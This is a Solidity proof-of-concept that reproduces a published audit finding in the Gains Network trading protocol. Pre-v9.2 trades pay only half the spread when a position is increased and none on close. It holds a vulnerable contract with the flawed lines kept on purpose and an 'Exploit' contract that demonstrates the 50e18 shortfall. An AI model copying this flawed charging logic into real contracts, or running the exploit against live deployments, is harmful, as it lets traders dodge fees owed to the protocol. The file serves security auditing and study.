// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Gains Network finding 40188 (H-01):
// "Inconsistent spread and price impact charges".
//
// Real audited source (the two vulnerable blocks are reproduced VERBATIM from the
// embedded snippets of the audit report; the vulnerable line is marked @>):
//   protocol Gains Network (gTrade) — v9.2 multi-collateral diamond
//   fns    UpdatePositionSizeUtils.prepareCallbackValues   (position-size INCREASE)
//          TradingCommonUtils.getTradeClosingPriceImpact    (position-size DECREASE / CLOSE)
//   report github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-July2.md  (H-01, id 40188)
//
// Root cause: the protocol splits spread + price impact half-on-increase /
// half-on-close for v9.2 trades. But the INCREASE path charges HALF
// unconditionally — `getMarketExecutionPrice(..., /*useHalfSpread*/ true)` (the @>
// line) — even for a trade opened BEFORE v9.2, whose CLOSE path
// (`getTradeClosingPriceImpact`) returns the raw market price and charges ZERO
// (the `maxLiqSpreadP == 0` early return). So a pre-v9.2 trade that increases and
// then closes pays only 50% of the spread + price impact it owes; the other 50%
// is never collected. The fix (per the report) is to charge the FULL 100% on an
// increase when the trade was opened before v9.2.
//
// Harm (fee under-collection / silent accounting): a pre-v9.2 trader increases a
// $10,000-collateral position paying 50e18 spread (should be 100e18), then closes
// paying 0. The 50e18 the protocol fails to collect is the harm. There is no
// positive token transfer to the attacker (spread is captured as a worse/omitted
// execution price, not an ERC20 transfer to the trader), so the magnitude of the
// uncollected spread is minted to SINK 0x000000000000000000000000000000000000D00d
// on a `gSPRD` marker token. A post-v9.2 trade is run as a contrast: its close DOES
// charge the other 50e18 (total 100%), which the pre-v9.2 trade escapes.
//
// Faithful minimal doubles: real DAI-like ERC20 collateral actually transferred
// into the protocol's spread pool; the diamond helpers (getTradePriceImpact,
// getUsdNormalizedValue, getTradeLiquidationParams) and the getMarketExecutionPrice
// spread math reproduced faithfully; `spreadP` bundles the combined spread +
// price-impact percentage the finding refers to (the `useHalfSpread` flag halves
// it exactly as the audited call does). Price precision P_10 = 1e10, leverage
// precision 1e3, matching Gains Network.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful reproduction of the audited `ConstantsUtils` price precision.
library ConstantsUtils {
    uint256 internal constant P_10 = 1e10;
}

/// @dev Faithful minimal subsets of the audited storage/param types (only the
///      fields the two verbatim blocks touch).
interface ITradingStorage {
    struct Trade {
        address user;
        uint32 index;
        uint16 pairIndex;
        bool long;
        uint8 collateralIndex;
        uint256 collateralAmount;
        uint24 leverage; // 1e3 precision (10_000 == 10x)
    }
}

interface ITradingCallbacks {
    struct AggregatorAnswer {
        uint256 price;   // 1e10 precision
        uint256 spreadP; // combined spread + price-impact percentage
    }
}

interface IUpdatePositionSizeUtils {
    struct IncreasePositionSizeValues {
        uint256 positionSizeCollateralDelta;
        uint256 priceAfterImpact;
    }
}

interface IPairsStorage {
    struct GroupLiquidationParams {
        uint256 maxLiqSpreadP; // == 0  <=> trade opened before v9.2
    }
}

interface ITradingCommonUtils {
    struct TradePriceImpactInput {
        ITradingStorage.Trade trade;
        uint256 marketPrice; // 1e10 precision
    }
}

/// @dev Diamond interface — in Gains Network `_getMultiCollatDiamond()` returns the
///      diamond proxy, which IS the same contract, so here it resolves to
///      `address(this)` (see `_getMultiCollatDiamond()` below).
interface IGNSMultiCollatDiamond {
    function getTradePriceImpact(
        uint256 _marketPrice,
        uint16 _pairIndex,
        bool _long,
        uint256 _tradeOpenInterestUsd,
        bool _open,
        bool _pnl,
        uint256 _lastWindowId
    ) external view returns (uint256 priceImpactP, uint256 priceAfterImpact);

    function getUsdNormalizedValue(uint8 _collateralIndex, uint256 _collateralAmount)
        external
        view
        returns (uint256);

    function getTradeLiquidationParams(address _trader, uint32 _index)
        external
        view
        returns (IPairsStorage.GroupLiquidationParams memory);
}

/// @dev Faithful minimal double of the audited `TradingCommonUtils` spread helper.
///      Applies (half) the spread to the market price. `_spreadP` bundles the
///      combined spread + price-impact percentage the finding refers to; the
///      `_useHalfSpread` flag halves it, exactly as the audited call does.
library TradingCommonUtils {
    function getMarketExecutionPrice(
        uint256 _price,
        uint256 _spreadP,
        bool _long,
        bool _useHalfSpread
    ) internal pure returns (uint256) {
        uint256 spread = (_price * (_useHalfSpread ? _spreadP / 2 : _spreadP)) / 100 / ConstantsUtils.P_10;
        return _long ? _price + spread : _price - spread;
    }
}

/// @dev Faithful minimal ERC20 double: real balances/transfers for the DAI-like
///      collateral and for the `gSPRD` SINK marker token.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the increase-side `prepareCallbackValues` price-impact
// block and the close-side `getTradeClosingPriceImpact` early return are
// reproduced VERBATIM from the audited Gains Network source. Combines the
// (real) separate diamond facets (UpdatePositionSizeUtils / TradingCommonUtils /
// PriceImpactUtils / PairsStorage) into one faithful contract; `_getMultiCollat
// Diamond()` therefore returns `address(this)`.
// ─────────────────────────────────────────────────────────────────────────────
contract GNSTrading {
    using TradingCommonUtils for uint256;

    MiniToken public immutable collateral;

    // combined spread + price-impact percentage used on the close side (matches
    // `_answer.spreadP` supplied on the increase side).
    uint256 public spreadP = 1e10; // == 1% at P_10 precision

    // protocol spread revenue actually collected (real custodied collateral).
    uint256 public spreadPool;

    // per-trade liquidation params; maxLiqSpreadP == 0 <=> opened before v9.2.
    mapping(address => mapping(uint32 => IPairsStorage.GroupLiquidationParams)) internal _liqParams;

    constructor(address _collateral) {
        collateral = MiniToken(_collateral);
    }

    function _getMultiCollatDiamond() internal view returns (IGNSMultiCollatDiamond) {
        return IGNSMultiCollatDiamond(address(this));
    }

    // ── setup helpers (faithful, out of the vulnerable path) ──
    function setLiquidationParams(address _trader, uint32 _index, uint256 _maxLiqSpreadP) external {
        _liqParams[_trader][_index].maxLiqSpreadP = _maxLiqSpreadP;
    }

    // ── diamond helper doubles (resolved via `address(this)`) ──
    function getTradePriceImpact(
        uint256 _marketPrice,
        uint16, /* _pairIndex */
        bool, /* _long */
        uint256, /* _tradeOpenInterestUsd */
        bool, /* _open */
        bool, /* _pnl */
        uint256 /* _lastWindowId */
    ) external pure returns (uint256 priceImpactP, uint256 priceAfterImpact) {
        // Faithful minimal double: no depth/open-interest in scope, so the only
        // execution-price adjustment is the spread already applied by the caller's
        // `getMarketExecutionPrice(...)`. priceAfterImpact echoes that price.
        return (0, _marketPrice);
    }

    function getUsdNormalizedValue(uint8, /* _collateralIndex */ uint256 _collateralAmount)
        external
        pure
        returns (uint256)
    {
        // DAI-like collateral pegged at $1 -> 1:1 USD normalization.
        return _collateralAmount;
    }

    function getTradeLiquidationParams(address _trader, uint32 _index)
        external
        view
        returns (IPairsStorage.GroupLiquidationParams memory)
    {
        return _liqParams[_trader][_index];
    }

    // ══════════════════════ VERBATIM (increase side) ══════════════════════════
    // Reproduced from the audit report's `prepareCallbackValues` snippet. Steps 1–2
    // (elided as `...` in the report) are reproduced faithfully to populate
    // `values.positionSizeCollateralDelta`.
    function prepareCallbackValues(
        ITradingStorage.Trade memory _existingTrade,
        ITradingStorage.Trade memory _partialTrade,
        ITradingCallbacks.AggregatorAnswer memory _answer
    ) internal view returns (IUpdatePositionSizeUtils.IncreasePositionSizeValues memory values) {
        // 1-2. (faithful reproduction of the elided steps) size of the increase
        values.positionSizeCollateralDelta = _partialTrade.collateralAmount * _partialTrade.leverage / 1e3;
        // 3. Calculate price impact values
        (, values.priceAfterImpact) = _getMultiCollatDiamond().getTradePriceImpact(
            TradingCommonUtils.getMarketExecutionPrice(_answer.price, _answer.spreadP, _existingTrade.long, true), // @> VULN: charges HALF ("true") spread+price-impact on a position-size INCREASE regardless of version; a pre-v9.2 trade (whose close charges 0) must be charged the FULL 100% here
            _existingTrade.pairIndex,
            _existingTrade.long,
            _getMultiCollatDiamond().getUsdNormalizedValue(
                _existingTrade.collateralIndex,
                values.positionSizeCollateralDelta
            ),
            false,
            true,
            0
        );
    }
    // ═══════════════════════════════════════════════════════════════════════════

    // ══════════════════════ VERBATIM (close side) ═════════════════════════════
    // Reproduced from the audit report's `getTradeClosingPriceImpact` snippet. The
    // elided `...` post-v9.2 path is reproduced faithfully (mirror of the increase
    // half-spread charge) so the contrast branch is executable.
    function getTradeClosingPriceImpact(
        ITradingCommonUtils.TradePriceImpactInput memory _input
    ) external view returns (uint256 priceImpactP, uint256 priceAfterImpact, uint256 tradeValueCollateralNoFactor) {
        ITradingStorage.Trade memory trade = _input.trade;

        // 0. If trade opened before v9.2, return market price (no closing spread or price impact)
        if (_getMultiCollatDiamond().getTradeLiquidationParams(trade.user, trade.index).maxLiqSpreadP == 0) {
            return (0, _input.marketPrice, 0);
        }
        // ... (faithful reproduction of the elided post-v9.2 path): v9.2 trades ARE
        // charged the closing half spread + price impact. Closing a long sells into
        // the spread -> worse (lower) execution price; this is exactly the charge a
        // pre-v9.2 trade escapes via the early return above.
        uint256 closeExecPrice =
            TradingCommonUtils.getMarketExecutionPrice(_input.marketPrice, spreadP, !trade.long, true);
        return (0, closeExecPrice, 0);
    }
    // ═══════════════════════════════════════════════════════════════════════════

    // ── faithful settlement wrappers (out of the vulnerable path): turn the
    //    execution price into a real collateral charge and custody it. ──

    /// @notice Increase a position by `_partialTrade`'s size; pull the spread the
    ///         protocol actually charges (per prepareCallbackValues) into the pool.
    function increasePositionSize(
        ITradingStorage.Trade memory _existingTrade,
        ITradingStorage.Trade memory _partialTrade,
        ITradingCallbacks.AggregatorAnswer memory _answer
    ) external returns (uint256 spreadCharged) {
        IUpdatePositionSizeUtils.IncreasePositionSizeValues memory values =
            prepareCallbackValues(_existingTrade, _partialTrade, _answer);
        // long open executes above market by the (half) spread -> trader pays the diff
        spreadCharged =
            values.positionSizeCollateralDelta * (values.priceAfterImpact - _answer.price) / _answer.price;
        collateral.transferFrom(msg.sender, address(this), spreadCharged);
        spreadPool += spreadCharged;
    }

    /// @notice Close a position; pull the spread the protocol actually charges
    ///         (per getTradeClosingPriceImpact) into the pool. Zero for pre-v9.2.
    function closeTrade(ITradingStorage.Trade memory _trade, uint256 _marketPrice)
        external
        returns (uint256 spreadCharged)
    {
        ITradingCommonUtils.TradePriceImpactInput memory input;
        input.trade = _trade;
        input.marketPrice = _marketPrice;
        (, uint256 priceAfterImpact,) = this.getTradeClosingPriceImpact(input);
        uint256 positionSize = _trade.collateralAmount * _trade.leverage / 1e3;
        // closing a long executes below market by the (half) spread -> trader pays the diff
        spreadCharged = positionSize * (_marketPrice - priceAfterImpact) / _marketPrice;
        if (spreadCharged > 0) {
            collateral.transferFrom(msg.sender, address(this), spreadCharged);
            spreadPool += spreadCharged;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a pre-v9.2 trader increases (pays 50% spread) then closes (pays
// 0%), avoiding the 50% the protocol should have collected. Proves the 50e18
// shortfall against a full-charge baseline, and against a post-v9.2 trade whose
// close DOES charge the other 50e18. The uncollected spread is minted to SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniToken public collateral; // DAI-like
    MiniToken public marker;     // gSPRD SINK marker
    GNSTrading public mgr;       // VULN

    uint256 public increaseCharged;     // pre-v9.2 increase (50% == 50e18)
    uint256 public closeCharged;        // pre-v9.2 close   (0)
    uint256 public fullChargeBaseline;  // correct increase (100% == 100e18)
    uint256 public postV92CloseCharged; // post-v9.2 close  (50% == 50e18) contrast
    uint256 public avoided;             // uncollected spread minted to SINK

    uint256 internal constant MARKET_PRICE = 1000e10; // $1000 at P_10
    uint256 internal constant SPREAD_P = 1e10;         // 1% combined spread + PI
    uint256 internal constant DELTA_COLLATERAL = 1000e18; // increase collateral
    uint24 internal constant LEVERAGE = 10_000;        // 10x at 1e3 precision

    constructor() {
        collateral = new MiniToken("Gains DAI", "DAI");            // child nonce 1
        marker = new MiniToken("Uncollected GNS Spread", "gSPRD"); // child nonce 2 (marker/profit token)
        mgr = new GNSTrading(address(collateral));                 // child nonce 3 (VULN)

        // Fund the trader (this contract) and approve the protocol.
        collateral.mint(address(this), 1_000e18);
        collateral.approve(address(mgr), type(uint256).max);
    }

    function _trade(uint32 index, bool preV92) internal view returns (ITradingStorage.Trade memory t) {
        t.user = address(this);
        t.index = index;
        t.pairIndex = 0;
        t.long = true;
        t.collateralIndex = 0;
        t.collateralAmount = DELTA_COLLATERAL;
        t.leverage = LEVERAGE;
        preV92; // documented: pre/post v9.2 is set via setLiquidationParams below
    }

    function run() external {
        ITradingCallbacks.AggregatorAnswer memory answer =
            ITradingCallbacks.AggregatorAnswer({price: MARKET_PRICE, spreadP: SPREAD_P});

        // ── pre-v9.2 trade (index 0): maxLiqSpreadP == 0 ──
        ITradingStorage.Trade memory pre = _trade(0, true);
        mgr.setLiquidationParams(address(this), 0, 0); // opened before v9.2

        // Increase: charges HALF the spread (the @> VULN line) -> 50e18.
        increaseCharged = mgr.increasePositionSize(pre, pre, answer);
        // Close: pre-v9.2 early return -> 0 charge.
        closeCharged = mgr.closeTrade(pre, MARKET_PRICE);

        // Correct baseline: an increase of the same size should charge the FULL
        // 100% for a pre-v9.2 trade (per the report's recommendation).
        uint256 execFull =
            TradingCommonUtils.getMarketExecutionPrice(MARKET_PRICE, SPREAD_P, true, false);
        uint256 positionSize = DELTA_COLLATERAL * LEVERAGE / 1e3; // 10_000e18
        fullChargeBaseline = positionSize * (execFull - MARKET_PRICE) / MARKET_PRICE;

        // ── post-v9.2 trade (index 1): maxLiqSpreadP != 0 -> close charges spread ──
        ITradingStorage.Trade memory post = _trade(1, false);
        mgr.setLiquidationParams(address(this), 1, 100); // opened after v9.2
        postV92CloseCharged = mgr.closeTrade(post, MARKET_PRICE);

        // ── harm assertions ──
        require(increaseCharged == 50e18, "increase must charge only HALF (bug)");
        require(closeCharged == 0, "pre-v9.2 close must charge ZERO (bug)");
        require(fullChargeBaseline == 100e18, "correct full increase charge");
        // post-v9.2 close DOES collect the other half the pre-v9.2 trade escaped.
        require(postV92CloseCharged == 50e18, "post-v9.2 close charges the other half");

        // Spread the protocol failed to collect on the pre-v9.2 trade.
        avoided = (fullChargeBaseline + 0) - (increaseCharged + closeCharged);
        require(avoided == 50e18, "uncollected spread must be 50e18");

        // Mint the uncollected spread to SINK as the quantified accounting harm.
        marker.mint(SINK, avoided);
        require(marker.balanceOf(SINK) == avoided && avoided > 0, "no shortfall recorded at sink");
    }
}
